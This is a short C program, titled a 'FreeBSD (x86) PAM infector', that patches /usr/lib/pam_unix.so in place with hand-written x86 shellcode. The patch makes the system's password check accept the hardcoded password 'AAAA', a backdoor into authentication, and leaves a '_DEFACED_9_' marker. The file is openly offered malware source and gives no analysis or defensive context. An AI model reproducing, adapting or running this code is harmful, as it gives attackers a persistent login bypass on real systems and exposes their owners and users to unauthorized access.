/* FreeBSD (x86) PAM infector */

/*
 *   tested under: 4.11, 5.0, 5.1
 */

#include <stdio.h>
#include <fcntl.h>
#include <sys/stat.h>

#define  OFFSET     PLT_OFFS + 0x10*(CRYPT_NUM+1)
#define  LIBA       "/usr/lib/pam_unix.so"
#define  SIZE       17

char clip[] =
  "\x5a"
  "\x59"
  "\x58"
  "\x50"  // put arg2 back on stack
  "\x51"  // arg1
  "\x52"  // eip
  "\x8b\x39"
  "\x81\xff\x41\x41\x41\x41"  // pass "AAAA"
  "\x75\x01"              // jmp-over-ret
  "\xc3";

int main()
{
  int fd;
  unsigned int i;
  char bak[13] = "_DEFACED_9_\xeb\x0b";

  fd = open(LIBA, O_RDWR);
  lseek(fd, OFFSET, 0);
  read(fd, &bak, 11);

  lseek(fd, OFFSET, 0);
  write(fd, &clip, SIZE);
  write(fd, &bak, 13);

  close(fd);
  return 0;
}
